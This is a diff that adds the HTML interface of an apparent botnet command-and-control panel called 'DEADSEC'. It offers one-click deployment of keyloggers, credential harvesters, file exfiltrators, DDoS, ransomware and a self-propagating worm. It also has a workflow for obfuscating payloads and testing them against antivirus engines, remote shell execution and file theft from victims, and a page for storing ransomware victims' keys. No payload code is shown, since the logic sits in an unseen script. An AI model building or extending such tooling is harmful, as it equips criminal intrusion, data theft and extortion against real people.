@@ -1,0 +1,792 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DEADSEC // COMMAND CENTER // ELITE CYBER OPERATIONS</title>
+    <link rel="stylesheet" href="styles_new.css">
+    
+    <!-- Leaflet CSS for Map -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" 
+          integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" 
+          crossorigin=""/>
+    
+    <!-- Leaflet MarkerCluster CSS -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.5.3/dist/MarkerCluster.css" />
+    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.5.3/dist/MarkerCluster.Default.css" />
+    
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><circle cx=%2250%22 cy=%2250%22 r=%2240%22 fill=%22%23ff0040%22/></svg>">
+</head>
+<body>
+    <!-- Top Header Bar -->
+    <header class="top-header">
+        <div class="header-left">
+            <div class="logo-brand">
+                <span class="logo-icon">◢◤ DEADSEC ◥◣</span>
+                <span class="brand-tagline">ELITE CYBER OPERATIONS</span>
+            </div>
+        </div>
+        <div class="header-center">
+            <h1 class="main-title">COMMAND CENTER</h1>
+            <div class="status-bar">
+                <span class="status-item">REAL-TIME SURVEILLANCE</span>
+                <span class="status-divider">//</span>
+                <span class="status-item">COMPROMISED SYSTEMS ONLINE</span>
+                <span class="status-divider">//</span>
+                <span class="status-item">ENCRYPTED COMMUNICATIONS ACTIVE</span>
+            </div>
+        </div>
+        <div class="header-right">
+            <div class="threat-status">
+                <span class="threat-level critical">THREAT LEVEL: CRITICAL</span>
+                <span class="operation-status active">OPERATION STATUS: INFILTRATION ACTIVE</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Container -->
+    <div class="container">
+        <!-- Navigation Sidebar -->
+        <nav class="sidebar">
+            <div class="nav-section">
+                <div class="section-title">CORE SYSTEMS</div>
+                <a href="#dashboard" class="nav-item active" data-page="dashboard">
+                    <span class="nav-icon">[DASH]</span>
+                    <span class="nav-text">Command Dashboard</span>
+                </a>
+                <a href="#bots" class="nav-item" data-page="bots">
+                    <span class="nav-icon">[BOTS]</span>
+                    <span class="nav-text">Bot Network</span>
+                </a>
+                <a href="#payloads" class="nav-item" data-page="payloads">
+                    <span class="nav-icon">[WPNS]</span>
+                    <span class="nav-text">Weapon Systems</span>
+                </a>
+            </div>
+            <div class="nav-section">
+                <div class="section-title">OPERATIONS</div>
+                <a href="#commands" class="nav-item" data-page="commands">
+                    <span class="nav-icon">[EXEC]</span>
+                    <span class="nav-text">Remote Execution</span>
+                </a>
+                <a href="#files" class="nav-item" data-page="files">
+                    <span class="nav-icon">[FILE]</span>
+                    <span class="nav-text">Data Extraction</span>
+                </a>
+                <a href="#av-evasion" class="nav-item" data-page="av-evasion">
+                    <span class="nav-icon">[EVAD]</span>
+                    <span class="nav-text">Stealth Operations</span>
+                </a>
+            </div>
+            <div class="nav-section">
+                <div class="section-title">INTELLIGENCE</div>
+                <a href="#bot-map" class="nav-item" data-page="bot-map">
+                    <span class="nav-icon">[MAP]</span>
+                    <span class="nav-text">Bot Map</span>
+                </a>
+                <a href="#console" class="nav-item" data-page="console">
+                    <span class="nav-icon">[CONS]</span>
+                    <span class="nav-text">Intelligence Feed</span>
+                </a>
+                <a href="#ransom-keys" class="nav-item" data-page="ransom-keys">
+                    <span class="nav-icon">[KEYS]</span>
+                    <span class="nav-text">Ransomware Keys</span>
+                </a>
+                <a href="#settings" class="nav-item" data-page="settings">
+                    <span class="nav-icon">[CONF]</span>
+                    <span class="nav-text">System Config</span>
+                </a>
+            </div>
+        </nav>
+
+        <!-- Main Content Area -->
+        <main class="content">
+            <!-- Dashboard Page -->
+            <div id="dashboard" class="page active">
+                <!-- Stats Overview -->
+                <div class="stats-overview">
+                    <div class="stat-card">
+                        <div class="stat-header">
+                            <span class="stat-label">[BOTS]</span>
+                            <span class="stat-status">TOTAL COMPROMISED</span>
+                        </div>
+                        <div class="stat-value" id="stat-total-bots">0</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-header">
+                            <span class="stat-label">[LIVE]</span>
+                            <span class="stat-status">ACTIVE CONNECTIONS</span>
+                        </div>
+                        <div class="stat-value" id="stat-online-bots">0</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-header">
+                            <span class="stat-label">[EXEC]</span>
+                            <span class="stat-status">COMMANDS EXECUTED</span>
+                        </div>
+                        <div class="stat-value" id="stat-commands">0</div>
+                    </div>
+                    <div class="stat-card success">
+                        <div class="stat-header">
+                            <span class="stat-label">[SUCC]</span>
+                            <span class="stat-status">MISSION SUCCESS RATE</span>
+                        </div>
+                        <div class="stat-value" id="stat-success-rate">100%</div>
+                    </div>
+                </div>
+
+                <!-- Operations Panel -->
+                <div class="operations-panel">
+                    <div class="panel-header">
+                        <h2>RAPID STRIKE OPERATIONS</h2>
+                        <button class="refresh-btn" onclick="refreshAllData()">[REFRESH]</button>
+                    </div>
+                    <div class="operations-grid">
+                        <div class="operation-card">
+                            <div class="op-header">
+                                <span class="op-code">[CRED]</span>
+                                <span class="op-name">CREDENTIAL EXTRACTION</span>
+                            </div>
+                        </div>
+                        <div class="operation-card">
+                            <div class="op-header">
+                                <span class="op-code">[KEYS]</span>
+                                <span class="op-name">KEYSTROKE MONITOR</span>
+                            </div>
+                        </div>
+                        <div class="operation-card">
+                            <div class="op-header">
+                                <span class="op-code">[SCRN]</span>
+                                <span class="op-name">SCREEN CAPTURE</span>
+                            </div>
+                        </div>
+                        <div class="operation-card">
+                            <div class="op-header">
+                                <span class="op-code">[SCAN]</span>
+                                <span class="op-name">NETWORK RECONNAISSANCE</span>
+                            </div>
+                        </div>
+                        <div class="operation-card warning">
+                            <div class="op-header">
+                                <span class="op-code">[PRIV]</span>
+                                <span class="op-name">PRIVILEGE ESCALATION</span>
+                            </div>
+                        </div>
+                        <div class="operation-card danger">
+                            <div class="op-header">
+                                <span class="op-code">[ATTK]</span>
+                                <span class="op-name">NETWORK ATTACK</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Activity Feed -->
+                <div class="activity-panel">
+                    <div class="panel-header">
+                        <h2>ENCRYPTED ACTIVITY LOG</h2>
+                    </div>
+                    <div class="activity-feed" id="dashboard-activity">
+                        <div class="activity-item">
+                            <span class="activity-time">[18:09:35 am]</span>
+                            <span class="activity-icon">●</span>
+                            <span class="activity-text">DEADSEC Command Center initialized</span>
+                        </div>
+                        <div class="activity-item">
+                            <span class="activity-time">[18:09:35 am]</span>
+                            <span class="activity-icon warning">▲</span>
+                            <span class="activity-text">All operations encrypted and anonymized</span>
+                        </div>
+                        <div class="activity-item">
+                            <span class="activity-time">[18:09:35 am]</span>
+                            <span class="activity-icon">🔒</span>
+                            <span class="activity-text">Secure channel established</span>
+                        </div>
+                        <div class="activity-item">
+                            <span class="activity-time">[18:09:35 am]</span>
+                            <span class="activity-icon">■</span>
+                            <span class="activity-text">Refreshing all data...</span>
+                        </div>
+                        <div class="activity-item">
+                            <span class="activity-time">[18:09:35 am]</span>
+                            <span class="activity-icon success">●</span>
+                            <span class="activity-text">Bots refreshed successfully</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Other pages -->
+            <div id="bots" class="page">
+                <div class="page-header">
+                    <h2>BOT NETWORK MANAGEMENT</h2>
+                    <div class="page-controls">
+                        <button onclick="refreshBots()" class="btn btn-primary">[REFRESH NETWORK]</button>
+                        <span class="bot-counter">Connected Bots: <span id="bot-count">0</span></span>
+                    </div>
+                </div>
+                <div class="bot-grid" id="bot-list">
+                    <div class="empty-state">
+                        <div class="icon">🤖</div>
+                        <h3>No Bots Connected</h3>
+                        <p>Deploy agents on target systems to see them here</p>
+                    </div>
+                </div>
+            </div>
+
+            <div id="payloads" class="page">
+                <div class="page-header">
+                    <h2>WEAPON SYSTEMS</h2>
+                    <div class="target-info">
+                        <span>Target: <span id="selected-bot-display-payloads">No bot selected</span></span>
+                    </div>
+                </div>
+                <div class="payload-grid">
+                    <div class="payload-card" onclick="quickDeploy('keylogger')">
+                        <div class="payload-header">
+                            <span class="payload-icon">⌨️</span>
+                            <span class="payload-name">KEYLOGGER</span>
+                        </div>
+                        <div class="payload-desc">Monitor all keystrokes</div>
+                    </div>
+                    <div class="payload-card" onclick="quickDeploy('credential_harvester')">
+                        <div class="payload-header">
+                            <span class="payload-icon">🔑</span>
+                            <span class="payload-name">CREDENTIAL HARVESTER</span>
+                        </div>
+                        <div class="payload-desc">Extract stored passwords</div>
+                    </div>
+                    <div class="payload-card" onclick="quickDeploy('screenshot_capture')">
+                        <div class="payload-header">
+                            <span class="payload-icon">📸</span>
+                            <span class="payload-name">SCREEN CAPTURE</span>
+                        </div>
+                        <div class="payload-desc">Take screenshots remotely</div>
+                    </div>
+                    <div class="payload-card" onclick="quickDeploy('file_exfiltrator')">
+                        <div class="payload-header">
+                            <span class="payload-icon">📁</span>
+                            <span class="payload-name">FILE EXFILTRATOR</span>
+                        </div>
+                        <div class="payload-desc">Extract sensitive files</div>
+                    </div>
+                    <div class="payload-card" onclick="quickDeploy('network_scanner')">
+                        <div class="payload-header">
+                            <span class="payload-icon">🌐</span>
+                            <span class="payload-name">NETWORK SCANNER</span>
+                        </div>
+                        <div class="payload-desc">Scan network topology</div>
+                    </div>
+                    <div class="payload-card" onclick="quickDeploy('ddos_attack')">
+                        <div class="payload-header">
+                            <span class="payload-icon">💥</span>
+                            <span class="payload-name">DDOS ATTACK</span>
+                        </div>
+                        <div class="payload-desc">Launch distributed attacks</div>
+                    </div>
+                    <div class="payload-card" onclick="quickDeploy('persistence')">
+                        <div class="payload-header">
+                            <span class="payload-icon">🔗</span>
+                            <span class="payload-name">PERSISTENCE</span>
+                        </div>
+                        <div class="payload-desc">Maintain system access</div>
+                    </div>
+                    <div class="payload-card warning" onclick="quickDeploy('privesc_exploit')">
+                        <div class="payload-header">
+                            <span class="payload-icon">⚡</span>
+                            <span class="payload-name">PRIVILEGE ESCALATION</span>
+                        </div>
+                        <div class="payload-desc">Escalate system privileges</div>
+                    </div>
+                    <div class="payload-card danger" onclick="quickDeploy('ransomware')">
+                        <div class="payload-header">
+                            <span class="payload-icon">🔒</span>
+                            <span class="payload-name">RANSOMWARE</span>
+                        </div>
+                        <div class="payload-desc">Encrypt files & demand ransom</div>
+                    </div>
+                    <div class="payload-card critical" onclick="quickDeploy('network_worm')">
+                        <div class="payload-header">
+                            <span class="payload-icon">🕸️</span>
+                            <span class="payload-name">NETWORK WORM</span>
+                        </div>
+                        <div class="payload-desc">Self-propagate & recruit bots</div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="av-evasion" class="page">
+                <div class="page-header">
+                    <h2>STEALTH OPERATIONS</h2>
+                    <div class="stealth-status">
+                        <span class="status-item">🛡️ EVASION ENGINE: <span class="status-active">READY</span></span>
+                        <span class="status-item">🎯 TARGET: <span id="selected-bot-display-stealth">No bot selected</span></span>
+                    </div>
+                </div>
+                
+                <div class="stealth-workflow">
+                    <!-- Step 1: Select Payload -->
+                    <div class="workflow-step">
+                        <div class="step-header">
+                            <span class="step-number">1</span>
+                            <h3>SELECT PAYLOAD TO MODIFY</h3>
+                            <span class="step-status" id="step1-status">Select payload</span>
+                        </div>
+                        <div class="payload-selector">
+                            <div class="payload-options">
+                                <div class="payload-option" data-payload="keylogger" onclick="selectStealthPayload('keylogger')">
+                                    <div class="option-icon">⌨️</div>
+                                    <div class="option-name">Keylogger</div>
+                                    <div class="option-desc">Monitor keystrokes</div>
+                                </div>
+                                <div class="payload-option" data-payload="credential_harvester" onclick="selectStealthPayload('credential_harvester')">
+                                    <div class="option-icon">🔑</div>
+                                    <div class="option-name">Credential Harvester</div>
+                                    <div class="option-desc">Extract passwords</div>
+                                </div>
+                                <div class="payload-option" data-payload="screenshot_capture" onclick="selectStealthPayload('screenshot_capture')">
+                                    <div class="option-icon">📸</div>
+                                    <div class="option-name">Screen Capture</div>
+                                    <div class="option-desc">Take screenshots</div>
+                                </div>
+                                <div class="payload-option" data-payload="file_exfiltrator" onclick="selectStealthPayload('file_exfiltrator')">
+                                    <div class="option-icon">📁</div>
+                                    <div class="option-name">File Exfiltrator</div>
+                                    <div class="option-desc">Extract files</div>
+                                </div>
+                                <div class="payload-option" data-payload="network_scanner" onclick="selectStealthPayload('network_scanner')">
+                                    <div class="option-icon">🌐</div>
+                                    <div class="option-name">Network Scanner</div>
+                                    <div class="option-desc">Scan networks</div>
+                                </div>
+                                <div class="payload-option" data-payload="ddos_attack" onclick="selectStealthPayload('ddos_attack')">
+                                    <div class="option-icon">💥</div>
+                                    <div class="option-name">DDoS Attack</div>
+                                    <div class="option-desc">Launch distributed attacks</div>
+                                </div>
+                                <div class="payload-option" data-payload="persistence" onclick="selectStealthPayload('persistence')">
+                                    <div class="option-icon">🔗</div>
+                                    <div class="option-name">Persistence</div>
+                                    <div class="option-desc">Maintain system access</div>
+                                </div>
+                                <div class="payload-option" data-payload="privesc_exploit" onclick="selectStealthPayload('privesc_exploit')">
+                                    <div class="option-icon">⚡</div>
+                                    <div class="option-name">Privilege Escalation</div>
+                                    <div class="option-desc">Escalate privileges</div>
+                                </div>
+                                <div class="payload-option warning" data-payload="ransomware" onclick="selectStealthPayload('ransomware')">
+                                    <div class="option-icon">🔒</div>
+                                    <div class="option-name">Ransomware</div>
+                                    <div class="option-desc">Encrypt files & demand ransom</div>
+                                </div>
+                                <div class="payload-option danger" data-payload="network_worm" onclick="selectStealthPayload('network_worm')">
+                                    <div class="option-icon">🕸️</div>
+                                    <div class="option-name">Network Worm</div>
+                                    <div class="option-desc">Self-propagate & recruit bots</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Step 2: Configure Evasion -->
+                    <div class="workflow-step" id="step2" style="opacity: 0.5; pointer-events: none;">
+                        <div class="step-header">
+                            <span class="step-number">2</span>
+                            <h3>CONFIGURE EVASION TECHNIQUES</h3>
+                            <span class="step-status" id="step2-status">Complete step 1 first</span>
+                        </div>
+                        <div class="evasion-config">
+                            <div class="config-section">
+                                <h4>🔧 Obfuscation Methods</h4>
+                                <div class="technique-toggles">
+                                    <label class="technique-toggle">
+                                        <input type="checkbox" id="string-obfuscation" checked>
+                                        <span class="toggle-name">String Obfuscation</span>
+                                        <span class="toggle-desc">Encrypt and hide text strings</span>
+                                    </label>
+                                    <label class="technique-toggle">
+                                        <input type="checkbox" id="api-hashing" checked>
+                                        <span class="toggle-name">API Hashing</span>
+                                        <span class="toggle-desc">Hide Windows API calls</span>
+                                    </label>
+                                    <label class="technique-toggle">
+                                        <input type="checkbox" id="control-flow" checked>
+                                        <span class="toggle-name">Control Flow Flattening</span>
+                                        <span class="toggle-desc">Scramble code execution flow</span>
+                                    </label>
+                                </div>
+                            </div>
+                            <div class="config-section">
+                                <h4>🛡️ Anti-Analysis</h4>
+                                <div class="technique-toggles">
+                                    <label class="technique-toggle">
+                                        <input type="checkbox" id="vm-detection">
+                                        <span class="toggle-name">VM Detection</span>
+                                        <span class="toggle-desc">Detect virtual environments</span>
+                                    </label>
+                                    <label class="technique-toggle">
+                                        <input type="checkbox" id="debugger-detection">
+                                        <span class="toggle-name">Debugger Detection</span>
+                                        <span class="toggle-desc">Detect analysis tools</span>
+                                    </label>
+                                    <label class="technique-toggle">
+                                        <input type="checkbox" id="sandbox-evasion">
+                                        <span class="toggle-name">Sandbox Evasion</span>
+                                        <span class="toggle-desc">Evade automated analysis</span>
+                                    </label>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Step 3: Generate and Test -->
+                    <div class="workflow-step" id="step3" style="opacity: 0.5; pointer-events: none;">
+                        <div class="step-header">
+                            <span class="step-number">3</span>
+                            <h3>GENERATE & TEST STEALTH PAYLOAD</h3>
+                            <span class="step-status" id="step3-status">Complete previous steps</span>
+                        </div>
+                        <div class="generation-controls">
+                            <div class="control-group">
+                                <button onclick="generateStealthPayload()" class="btn btn-primary btn-large">
+                                    <span class="btn-icon">🔧</span>
+                                    GENERATE STEALTH PAYLOAD
+                                </button>
+                                <div class="control-desc">Creates an obfuscated version using selected techniques</div>
+                            </div>
+                            <div class="control-group">
+                                <button onclick="testAVEvasion()" class="btn btn-warning btn-large" id="test-btn" disabled>
+                                    <span class="btn-icon">🧪</span>
+                                    TEST AGAINST AV ENGINES
+                                </button>
+                                <div class="control-desc">Scans payload against 70+ antivirus engines</div>
+                            </div>
+                        </div>
+                        <div class="test-results" id="test-results" style="display: none;">
+                            <div class="results-header">
+                                <h4>🔍 DETECTION ANALYSIS</h4>
+                            </div>
+                            <div class="results-content">
+                                <div class="detection-score">
+                                    <span class="score-label">Detection Rate:</span>
+                                    <span class="score-value" id="detection-rate">0/70</span>
+                                    <span class="score-status" id="detection-status">UNDETECTED</span>
+                                </div>
+                                <div class="detection-details">
+                                    <div class="detail-item">✅ Windows Defender: Clean</div>
+                                    <div class="detail-item">✅ Malwarebytes: Clean</div>
+                                    <div class="detail-item">✅ Kaspersky: Clean</div>
+                                    <div class="detail-item">✅ Norton: Clean</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Step 4: Deploy -->
+                    <div class="workflow-step" id="step4" style="opacity: 0.5; pointer-events: none;">
+                        <div class="step-header">
+                            <span class="step-number">4</span>
+                            <h3>DEPLOY TO TARGET</h3>
+                            <span class="step-status" id="step4-status">Generate payload first</span>
+                        </div>
+                        <div class="deployment-controls">
+                            <div class="deployment-info">
+                                <div class="info-item">
+                                    <span class="info-label">Payload:</span>
+                                    <span class="info-value" id="selected-payload-name">None selected</span>
+                                </div>
+                                <div class="info-item">
+                                    <span class="info-label">Target Bot:</span>
+                                    <span class="info-value" id="target-bot-name">None selected</span>
+                                </div>
+                                <div class="info-item">
+                                    <span class="info-label">Evasion Level:</span>
+                                    <span class="info-value evasion-high">MAXIMUM</span>
+                                </div>
+                            </div>
+                            <button onclick="deployStealthPayload()" class="btn btn-danger btn-large" id="deploy-btn" disabled>
+                                <span class="btn-icon">🚀</span>
+                                DEPLOY STEALTH PAYLOAD
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="commands" class="page">
+                <div class="page-header">
+                    <h2>REMOTE EXECUTION</h2>
+                    <div class="target-info">
+                        <span>Target: <span id="selected-bot-display">No bot selected</span></span>
+                    </div>
+                </div>
+                <div class="command-interface">
+                    <div class="command-input-section">
+                        <div class="input-group">
+                            <label>Command Type:</label>
+                            <select id="command-type" class="form-control">
+                                <option value="shell">Shell Command</option>
+                                <option value="powershell">PowerShell</option>
+                                <option value="cmd">Command Prompt</option>
+                            </select>
+                        </div>
+                        <div class="input-group">
+                            <label>Command:</label>
+                            <input type="text" id="command-input" class="form-control" placeholder="Enter command to execute..." />
+                        </div>
+                        <div class="command-controls">
+                            <button onclick="executeCommand()" class="btn btn-danger">[EXECUTE]</button>
+                            <button onclick="clearCommand()" class="btn btn-secondary">[CLEAR]</button>
+                        </div>
+                    </div>
+                    <div class="command-output-section">
+                        <div class="output-header">
+                            <h3>Command Output</h3>
+                            <button onclick="document.getElementById('command-output').innerHTML = ''" class="btn btn-sm">[CLEAR OUTPUT]</button>
+                        </div>
+                        <div id="command-output" class="command-output"></div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="files" class="page">
+                <div class="page-header">
+                    <h2>DATA EXTRACTION</h2>
+                    <div class="target-info">
+                        <span>Target: <span id="selected-bot-display-files">No bot selected</span></span>
+                    </div>
+                </div>
+                <div class="file-operations">
+                    <div class="file-section">
+                        <div class="section-header">
+                            <h3>📤 UPLOAD FILE TO TARGET</h3>
+                        </div>
+                        <div class="file-form">
+                            <div class="input-group">
+                                <label>Local File Path:</label>
+                                <input type="text" id="upload-local" class="form-control" placeholder="C:\\path\\to\\local\\file.exe" />
+                            </div>
+                            <div class="input-group">
+                                <label>Remote Path on Target:</label>
+                                <input type="text" id="upload-remote" class="form-control" placeholder="C:\\temp\\file.exe" />
+                            </div>
+                            <button onclick="uploadFile()" class="btn btn-primary">[UPLOAD FILE]</button>
+                        </div>
+                    </div>
+                    <div class="file-section">
+                        <div class="section-header">
+                            <h3>📥 DOWNLOAD FILE FROM TARGET</h3>
+                        </div>
+                        <div class="file-form">
+                            <div class="input-group">
+                                <label>Remote File Path:</label>
+                                <input type="text" id="download-remote" class="form-control" placeholder="C:\\Users\\victim\\Documents\\passwords.txt" />
+                            </div>
+                            <div class="input-group">
+                                <label>Save to Local Path:</label>
+                                <input type="text" id="download-local" class="form-control" placeholder="C:\\extracted\\passwords.txt" />
+                            </div>
+                            <button onclick="downloadFile()" class="btn btn-success">[DOWNLOAD FILE]</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="av-evasion" class="page">
+                <div class="page-content">
+                    <h2>STEALTH OPERATIONS</h2>
+                    <p>AV evasion controls will be implemented here.</p>
+                </div>
+            </div>
+
+            <!-- Bot Map Page -->
+            <div id="bot-map" class="page">
+                <div class="page-header">
+                    <h2>🌍 GLOBAL BOT NETWORK MAP</h2>
+                    <div class="map-controls">
+                        <button onclick="refreshBotMap()" class="btn btn-primary">[REFRESH MAP]</button>
+                        <button onclick="toggleHeatmap()" class="btn btn-secondary" id="heatmap-toggle">[HEATMAP MODE]</button>
+                        <button onclick="centerMap()" class="btn btn-secondary">[CENTER VIEW]</button>
+                    </div>
+                </div>
+                
+                <!-- Map Stats -->
+                <div class="stats-overview" style="margin-bottom: 20px;">
+                    <div class="stat-card">
+                        <div class="stat-header">
+                            <span class="stat-label">[BOTS]</span>
+                            <span class="stat-status">TOTAL ON MAP</span>
+                        </div>
+                        <div class="stat-value" id="map-stat-total">0</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-header">
+                            <span class="stat-label">[COUNTRIES]</span>
+                            <span class="stat-status">INFECTED NATIONS</span>
+                        </div>
+                        <div class="stat-value" id="map-stat-countries">0</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-header">
+                            <span class="stat-label">[ONLINE]</span>
+                            <span class="stat-status">ACTIVE CONNECTIONS</span>
+                        </div>
+                        <div class="stat-value" id="map-stat-online">0</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-header">
+                            <span class="stat-label">[SPREAD]</span>
+                            <span class="stat-status">GLOBAL COVERAGE</span>
+                        </div>
+                        <div class="stat-value" id="map-stat-spread">0%</div>
+                    </div>
+                </div>
+
+                <!-- Map Container -->
+                <div class="map-container">
+                    <div id="world-map" style="height: 600px; width: 100%; border-radius: 8px; overflow: hidden;"></div>
+                </div>
+
+                <!-- Map Legend -->
+                <div class="map-legend">
+                    <h3>MAP LEGEND</h3>
+                    <div class="legend-items">
+                        <div class="legend-item">
+                            <span class="legend-marker online"></span>
+                            <span class="legend-label">Online Bot</span>
+                        </div>
+                        <div class="legend-item">
+                            <span class="legend-marker offline"></span>
+                            <span class="legend-label">Offline Bot</span>
+                        </div>
+                        <div class="legend-item">
+                            <span class="legend-marker cluster"></span>
+                            <span class="legend-label">Bot Cluster</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Bot List by Location -->
+                <div class="section-container" style="margin-top: 20px;">
+                    <h3>🌐 BOTS BY LOCATION</h3>
+                    <div id="bots-by-location" class="location-grid">
+                        <div class="empty-state">
+                            <span class="empty-icon">🗺️</span>
+                            <p>No bot location data available</p>
+                            <small>Bots will appear on the map when connected</small>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="console" class="page">
+                <div class="page-header">
+                    <h2>INTELLIGENCE FEED</h2>
+                    <div class="console-controls">
+                        <button onclick="clearConsole()" class="btn btn-warning">[CLEAR LOG]</button>
+                        <button onclick="refreshAllData()" class="btn btn-primary">[REFRESH ALL]</button>
+                    </div>
+                </div>
+                <div class="console-container">
+                    <div id="main-console" class="console-output">
+                        <div class="log-entry info">
+                            <span class="log-timestamp">[System]</span> DEADSEC Command Center initialized
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Ransomware Keys Page -->
+            <div id="ransom-keys" class="page">
+                <div class="page-header">
+                    <h2>🔒 RANSOMWARE ENCRYPTION KEYS</h2>
+                    <button onclick="refreshRansomKeys()" class="btn btn-primary">[REFRESH KEYS]</button>
+                </div>
+                
+                <div class="stats-overview" style="margin-bottom: 20px;">
+                    <div class="stat-card">
+                        <div class="stat-header">
+                            <span class="stat-label">[VICTIMS]</span>
+                            <span class="stat-status">TOTAL ENCRYPTED</span>
+                        </div>
+                        <div class="stat-value" id="stat-total-victims">0</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-header">
+                            <span class="stat-label">[FILES]</span>
+                            <span class="stat-status">FILES ENCRYPTED</span>
+                        </div>
+                        <div class="stat-value" id="stat-total-encrypted">0</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-header">
+                            <span class="stat-label">[KEYS]</span>
+                            <span class="stat-status">KEYS STORED</span>
+                        </div>
+                        <div class="stat-value" id="stat-stored-keys">0</div>
+                    </div>
+                </div>
+
+                <div class="section-container">
+                    <h3>🔑 VICTIM ENCRYPTION KEYS</h3>
+                    <div id="ransom-keys-container">
+                        <div class="empty-state">
+                            <span class="empty-icon">🔒</span>
+                            <p>No ransomware encryption keys found</p>
+                            <small>Keys will appear here when ransomware executes successfully</small>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="settings" class="page">
+                <div class="page-header">
+                    <h2>SYSTEM CONFIGURATION</h2>
+                    <button onclick="saveSettings()" class="btn btn-success">[SAVE SETTINGS]</button>
+                </div>
+                <div class="settings-container">
+                    <div class="settings-section">
+                        <h3>🌐 Server Configuration</h3>
+                        <div class="input-group">
+                            <label>Server URL:</label>
+                            <input type="text" id="server-url" class="form-control" value="http://localhost:5000" />
+                        </div>
+                    </div>
+                    <div class="settings-section">
+                        <h3>⏱️ Refresh Settings</h3>
+                        <div class="input-group">
+                            <label>Auto-refresh interval (seconds):</label>
+                            <input type="number" id="refresh-interval" class="form-control" value="10" min="1" max="300" />
+                        </div>
+                    </div>
+                    <div class="settings-section">
+                        <h3>📁 File Management</h3>
+                        <div class="input-group">
+                            <label>Default Output Directory:</label>
+                            <input type="text" id="output-dir" class="form-control" value="C:\\Temp" />
+                        </div>
+                    </div>
+                    <div class="settings-section">
+                        <h3>🔧 Advanced Options</h3>
+                        <div class="checkbox-group">
+                            <label><input type="checkbox" id="auto-refresh-enabled" checked> Enable auto-refresh</label>
+                            <label><input type="checkbox" id="sound-alerts" checked> Enable sound alerts</label>
+                            <label><input type="checkbox" id="debug-mode"> Debug mode</label>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Leaflet JS for Map -->
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" 
+            integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=" 
+            crossorigin=""></script>
+    
+    <!-- Leaflet MarkerCluster JS -->
+    <script src="https://unpkg.com/leaflet.markercluster@1.5.3/dist/leaflet.markercluster.js"></script>
+    
+    <script src="app.js"></script>
+</body>
+</html>
